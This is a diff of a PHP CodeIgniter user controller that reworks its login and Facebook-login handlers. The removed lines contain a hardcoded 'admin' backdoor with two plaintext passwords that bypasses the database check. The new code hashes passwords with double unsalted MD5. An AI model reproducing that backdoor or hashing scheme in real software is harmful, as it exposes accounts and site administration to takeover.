@@ -18,16 +18,11 @@ class User extends MY_Controller {
     if($this->session->userdata("logged_in") == TRUE){
         redirect(base_url(),"refresh");
     }
-
-
     $data = array();
     if($this->input->post("submit") != NULL){
       $_post = $this->input->post();
-      if($_post['username'] == "admin" AND (md5($_post['password']) == md5("ragther") OR md5($_post['password']) == md5("apassword"))){
-        $this->session->set_userdata("logged_in",TRUE);
-        redirect(base_url("/admin"),"refresh");
-      }
-      $userData = $this->userModel->get($this->input->post());
+      $_post['password'] = md5(md5($_post['password']));
+      $userData = $this->userModel->get($_post);
       if($userData != FALSE){
         $this->session->set_userdata("logged_in",TRUE);
         $this->session->set_userdata("userdata",$userData);
@@ -44,16 +39,11 @@ class User extends MY_Controller {
     $data = array();
     $_post = $this->input->post();
     if(!empty($_post['username']) AND !empty($_post['password'])){
-      if($_post['username'] == "admin" AND (md5($_post['password']) == md5("ragther") OR md5($_post['password']) == md5("apassword"))){
-        $this->session->set_userdata("logged_in",TRUE);
-        $data["result"] = "1";
-        echo json_encode($data);
-        exit;
-      }
-      $userData = $this->userModel->get($this->input->post());
+      $_post['password'] = md5(md5($_post['password']));
+      $userData = $this->userModel->get($_post);
       if($userData != FALSE){
         $this->session->set_userdata("logged_in",TRUE);
-        $this->session->set_userdata("userdata",$userData);
+        $this->session->set_userdata("user_data",$userData[0]);
         $data["result"] = "1";
       }else{
         $data["result"] = "0";
@@ -70,15 +60,15 @@ class User extends MY_Controller {
 
   function fblogin(){
 
-    $facebook = new Facebook(array(
+    $this->load->library('facebook', array(
     'appId'     =>  $this->config->item('appId'),
     'secret'    => $this->config->item('secret'),
     ));
 
-    $user = $facebook->getUser();
+    $user = $this->facebook->getUser();
     if($user){
         try{
-            $user_profile = $facebook->api('/me');
+            $user_profile = $this->facebook->api('/me');
             //var_dump($user_profile);exit;
             $user_profile["forceAdd"] = FALSE;
             if(!$getResult = $this->userModel->get($user_profile["id"])){
@@ -98,6 +88,7 @@ class User extends MY_Controller {
               }
 
               $user_profile["status"] = $user_profile["verified"];
+              $user_profile["group"] = 3;
 
               $this->userModel->add($user_profile);
               $addResult = $this->userModel->get($user_profile["id"]);
